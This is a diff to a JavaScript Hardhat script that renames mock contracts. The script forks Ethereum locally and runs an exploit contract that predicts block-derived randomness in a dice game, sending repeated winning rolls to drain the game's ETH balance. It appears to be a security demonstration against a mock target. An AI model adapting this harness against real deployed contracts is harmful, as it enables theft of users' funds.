@@ -6,10 +6,10 @@ const path = require("path");
  * 1. Using a local fork of the Ethereum network and a local wallet instance (Hardhat VM)
  * 2. Hardhat network & ethers.js
  * 3. Ethereum mainnet RPC provider
- * 4. Solidity contracts: IMockRiskyDiceGame, MockRiskyDiceGame, MockRiskyDiceGameExploit, Context, Ownable
+ * 4. Solidity contracts: IMockSolidityDiceGame, MockSolidityDiceGame, MockSolidityDiceGameExploit, Context, Ownable
  * 5. ethers.js "Contract" instances for the contracts 
  * 6. Deploy VM fork of the Ethereum network at the previous block and deploy the contracts
- * 7. Exploit the MockRiskyDiceGame contract
+ * 7. Exploit the MockSolidityDiceGame contract
  * 8. Verify the exploit
  * 9. Clean up the environment
  */
@@ -19,23 +19,23 @@ const FUND_AMOUNT = ethers.parseEther("100");
 const PROVIDER = new ethers.JsonRpcProvider("https://ethereum.publicnode.com");
 const JSON_RPC_URL = "https://ethereum.publicnode.com";
 
-const MOCKRISKYDICEGAME_COMPILATION_PATH = require(path.join(
+const MOCKSOLIDITYDICEGAME_COMPILATION_PATH = require(path.join(
   process.cwd(),
-  "contracts/MockRiskyDiceGame/compilation",
-  "MockRiskyDiceGame.json"
+  "contracts/MockSolidityDiceGame/compilation",
+  "MockSolidityDiceGame.json"
 ));
-const MOCKRISKYDICEGAMEEXPLOIT_COMPILATION_PATH = require(path.join(
+const MOCKSOLIDITYDICEGAMEEXPLOIT_COMPILATION_PATH = require(path.join(
   process.cwd(),
-  "contracts/MockRiskyDiceGameExploit/compilation",
-  "MockRiskyDiceGameExploit.json"
+  "contracts/MockSolidityDiceGameExploit/compilation",
+  "MockSolidityDiceGameExploit.json"
 ));
 
-const MOCKRISKYDICEGAME_ABI = MOCKRISKYDICEGAME_COMPILATION_PATH.abi;
-const MOCKRISKYDICEGAMEEXPLOIT_ABI = MOCKRISKYDICEGAMEEXPLOIT_COMPILATION_PATH.abi;
-const MOCKRISKYDICEGAMEEXPLOIT_BYTECODE = MOCKRISKYDICEGAMEEXPLOIT_COMPILATION_PATH.bytecode;
+const MOCKSOLIDITYDICEGAME_ABI = MOCKSOLIDITYDICEGAME_COMPILATION_PATH.abi;
+const MOCKSOLIDITYDICEGAMEEXPLOIT_ABI = MOCKSOLIDITYDICEGAMEEXPLOIT_COMPILATION_PATH.abi;
+const MOCKSOLIDITYDICEGAMEEXPLOIT_BYTECODE = MOCKSOLIDITYDICEGAMEEXPLOIT_COMPILATION_PATH.bytecode;
 
 // Initialize the VM fork of the Ethereum network, get the local account signer, set the balance of the local account to 100 ETH
-// then deploy the MockRiskyDiceGameExploit contract and return the initialized contracts and local account
+// then deploy the MockSolidityDiceGameExploit contract and return the initialized contracts and local account
 const initializeVMFork = async () => {
     // Disable auto-mining
     await network.provider.send("evm_setAutomine", [false]);
@@ -70,20 +70,20 @@ const initializeVMFork = async () => {
         ethers.toBeHex(FUND_AMOUNT)
     ]);
 
-    // Deploy the MockRiskyDiceGameExploit contract
-    const MockRiskyDiceGameExploit = new ethers.ContractFactory(MOCKRISKYDICEGAMEEXPLOIT_ABI, MOCKRISKYDICEGAMEEXPLOIT_BYTECODE, localAccount);
-    const MockRiskyDiceGameExploitContract = await MockRiskyDiceGameExploit.deploy(
-        { value: ethers.parseEther("10") } // Send 10 ETH with deployment (sent to MockRiskyDiceGame contract when deployed via the exploit contract)
+    // Deploy the MockSolidityDiceGameExploit contract
+    const MockSolidityDiceGameExploit = new ethers.ContractFactory(MOCKSOLIDITYDICEGAMEEXPLOIT_ABI, MOCKSOLIDITYDICEGAMEEXPLOIT_BYTECODE, localAccount);
+    const MockSolidityDiceGameExploitContract = await MockSolidityDiceGameExploit.deploy(
+        { value: ethers.parseEther("10") } // Send 10 ETH with deployment (sent to MockSolidityDiceGame contract when deployed via the exploit contract)
     );
-    const MockRiskyDiceGameExploitAddress = MockRiskyDiceGameExploitContract.target;
+    const MockSolidityDiceGameExploitAddress = MockSolidityDiceGameExploitContract.target;
     await network.provider.send("evm_mine");
-    await MockRiskyDiceGameExploitContract.waitForDeployment();
-    console.log('MockRiskyDiceGameExploit contract deployed at:', MockRiskyDiceGameExploitAddress);
+    await MockSolidityDiceGameExploitContract.waitForDeployment();
+    console.log('MockSolidityDiceGameExploit contract deployed at:', MockSolidityDiceGameExploitAddress);
 
     LOCAL_FORK = {
         localAccount,
-        MockRiskyDiceGameExploitContract,
-        MockRiskyDiceGameExploitAddress
+        MockSolidityDiceGameExploitContract,
+        MockSolidityDiceGameExploitAddress
     }
     
     console.log(`VM local fork initialized.\n`);
@@ -93,12 +93,12 @@ const initializeVMFork = async () => {
 // Execute the exploit on the VM fork of the Ethereum network
 const executeSimulatedExploit = async () => {
     await initializeVMFork();
-    const { localAccount, MockRiskyDiceGameExploitContract } = LOCAL_FORK;
+    const { localAccount, MockSolidityDiceGameExploitContract } = LOCAL_FORK;
 
-    // Get the address of the MockRiskyDiceGame contract from the exploit contract using the MockRiskyDiceGameAddress() function
-    const MockRiskyDiceGameAddress = await MockRiskyDiceGameExploitContract.MockRiskyDiceGameAddress();
-    // Create a new MockRiskyDiceGame contract instance
-    const MockRiskyDiceGameContract = new ethers.Contract(MockRiskyDiceGameAddress, MOCKRISKYDICEGAME_ABI, localAccount);
+    // Get the address of the MockSolidityDiceGame contract from the exploit contract using the MockSolidityDiceGameAddress() function
+    const MockSolidityDiceGameAddress = await MockSolidityDiceGameExploitContract.MockSolidityDiceGameAddress();
+    // Create a new MockSolidityDiceGame contract instance
+    const MockSolidityDiceGameContract = new ethers.Contract(MockSolidityDiceGameAddress, MOCKSOLIDITYDICEGAME_ABI, localAccount);
 
     // Get block info at snapshot
     const snapshotBlock = await ethers.provider.getBlock('latest');
@@ -109,17 +109,17 @@ const executeSimulatedExploit = async () => {
     const snapshotId = await network.provider.send("evm_snapshot");
     console.log("State snapshot taken, ID:", snapshotId);
 
-    // Call the testDeterministicHashResult function on the MockRiskyDiceGameExploit contract
+    // Call the testDeterministicHashResult function on the MockSolidityDiceGameExploit contract
     // This function updates the storedHashInputs variable (struct) with the hash (converted to uint256) 
     // of the msg.sender, anticipated block timestamp, txOrigin, txGasPrice, and blockHash if it satisfies the win condition
     
     // Since this function call is a transaction, we must wait for it to be mined
-    const testDeterministicHashesTx = await MockRiskyDiceGameExploitContract.testDeterministicHashResult();
+    const testDeterministicHashesTx = await MockSolidityDiceGameExploitContract.testDeterministicHashResult();
     await network.provider.send("evm_mine");
     await testDeterministicHashesTx.wait();
 
     // Step 2: Retrieve stored hash inputs after mining
-    const storedHashInputs = await MockRiskyDiceGameExploitContract.retrieveStoredHashInputs();
+    const storedHashInputs = await MockSolidityDiceGameExploitContract.retrieveStoredHashInputs();
     const structuredStoredHashInputs = {
         msgSender: storedHashInputs.msgSender,
         txOrigin: storedHashInputs.txOrigin,
@@ -134,7 +134,7 @@ const executeSimulatedExploit = async () => {
      * mainnet. We can't do that here so we'll revert to the snapshot (i.e. the correct block) to simulate the mainnet state.
      * 
      * To mimic the mainnet state, we'll set the block timestamp to the stored timestamp and mine a block after a series of 10 transactions to 
-     * drain the contract balance of the MockRiskyDiceGame contract. On the mainnet, the block timestamp is variable and can be set to any value
+     * drain the contract balance of the MockSolidityDiceGame contract. On the mainnet, the block timestamp is variable and can be set to any value
      * in the range of the previous block timestamp + 15 seconds by the builder, but usually it's set to the previous block timestamp + 12 seconds.
      * 
      * This means it's possible to reliably predict the block timestamp and set it to the stored timestamp to execute the winning transaction
@@ -162,10 +162,10 @@ const executeSimulatedExploit = async () => {
         console.log(`Gas price sufficient (${ethers.formatUnits(storedGasPrice, "gwei")} Gwei)`);
 
         // Get initial balances
-        const initialDiceGameBalance = await MockRiskyDiceGameContract.getEthBalance();
-        console.log(`\nInitial MockRiskyDiceGame contract balance: ${ethers.formatEther(initialDiceGameBalance)}`);
-        const initialExploitBalance = await MockRiskyDiceGameExploitContract.getEthBalance();
-        console.log(`Initial MockRiskyDiceGameExploit contract balance: ${ethers.formatEther(initialExploitBalance)}`);
+        const initialDiceGameBalance = await MockSolidityDiceGameContract.getEthBalance();
+        console.log(`\nInitial MockSolidityDiceGame contract balance: ${ethers.formatEther(initialDiceGameBalance)}`);
+        const initialExploitBalance = await MockSolidityDiceGameExploitContract.getEthBalance();
+        console.log(`Initial MockSolidityDiceGameExploit contract balance: ${ethers.formatEther(initialExploitBalance)}`);
 
         // Create multiple transactions before mining
         const pendingTransactions = [];
@@ -194,11 +194,11 @@ const executeSimulatedExploit = async () => {
                     console.log(`Current:  ${currentBlock.hash}`);
                 }
 
-                const tx = await MockRiskyDiceGameExploitContract.executeWinningDiceRoll(
+                const tx = await MockSolidityDiceGameExploitContract.executeWinningDiceRoll(
                     structuredStoredHashInputs,
                     {
                         gasPrice: structuredStoredHashInputs.txGasPrice,
-                        value: ethers.parseEther("1"), // Send 1 ETH with the transaction as required by the MockRiskyDiceGame contract
+                        value: ethers.parseEther("1"), // Send 1 ETH with the transaction as required by the MockSolidityDiceGame contract
                         gasLimit: 500000,
                         nonce: currentNonce,
                         type: 0  // Legacy transaction type to avoid EIP-1559 fee calculations
@@ -257,16 +257,16 @@ const executeSimulatedExploit = async () => {
         }
 
         // Get final balances
-        const finalDiceGameBalance = await MockRiskyDiceGameContract.getEthBalance();
-        const finalExploitBalance = await MockRiskyDiceGameExploitContract.getEthBalance();
+        const finalDiceGameBalance = await MockSolidityDiceGameContract.getEthBalance();
+        const finalExploitBalance = await MockSolidityDiceGameExploitContract.getEthBalance();
 
         console.log(`\nExploit complete:`);
         console.log(`Total transactions: ${pendingTransactions.length}`);
         console.log(`Successful transactions: ${successfulTransactions}`);
-        console.log(`Initial MockRiskyDiceGame contract balance: ${ethers.formatEther(initialDiceGameBalance)} ETH`);
-        console.log(`Final MockRiskyDiceGame contract balance: ${ethers.formatEther(finalDiceGameBalance)} ETH`);
-        console.log(`Initial MockRiskyDiceGameExploit contract balance: ${ethers.formatEther(initialExploitBalance)} ETH`);
-        console.log(`Final MockRiskyDiceGameExploit contract balance: ${ethers.formatEther(finalExploitBalance)} ETH`);
+        console.log(`Initial MockSolidityDiceGame contract balance: ${ethers.formatEther(initialDiceGameBalance)} ETH`);
+        console.log(`Final MockSolidityDiceGame contract balance: ${ethers.formatEther(finalDiceGameBalance)} ETH`);
+        console.log(`Initial MockSolidityDiceGameExploit contract balance: ${ethers.formatEther(initialExploitBalance)} ETH`);
+        console.log(`Final MockSolidityDiceGameExploit contract balance: ${ethers.formatEther(finalExploitBalance)} ETH`);
     } else {
         console.log("No winning combination found");
     }
